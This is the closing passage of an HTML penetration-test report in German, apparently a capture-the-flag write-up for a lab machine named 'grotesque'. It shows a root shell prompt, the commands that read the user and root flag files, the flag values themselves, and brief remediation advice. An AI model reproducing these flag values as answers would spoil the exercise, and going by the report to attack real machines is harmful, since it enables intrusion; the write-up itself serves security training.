+                     <pre><span class="password">AF7DD472654CBBCF87D3D7F509CB9862</span></pre>
+                     <div class="prompt">root@grotesque:~#</div>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `root` wird ins Home-Verzeichnis gewechselt und die Root-Flagge ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flagge `<span class="password">AF7DD472654CBBCF87D3D7F509CB9862</span>` wurde erfolgreich gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bericht abschließen.<br><strong>Empfehlung (Admin):** System bereinigen und alle identifizierten Schwachstellen beheben.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/raphael/user.txt</div>
+                    <div class="flag-value"><span class="password">F6ACB21652E095630BB1BEBD1E587FE7</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">AF7DD472654CBBCF87D3D7F509CB9862</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/John Scan übernommen -->
+        <p>Berichtsdatum: 16. November 2022</p>
+    </footer>
+</body>
+</html>
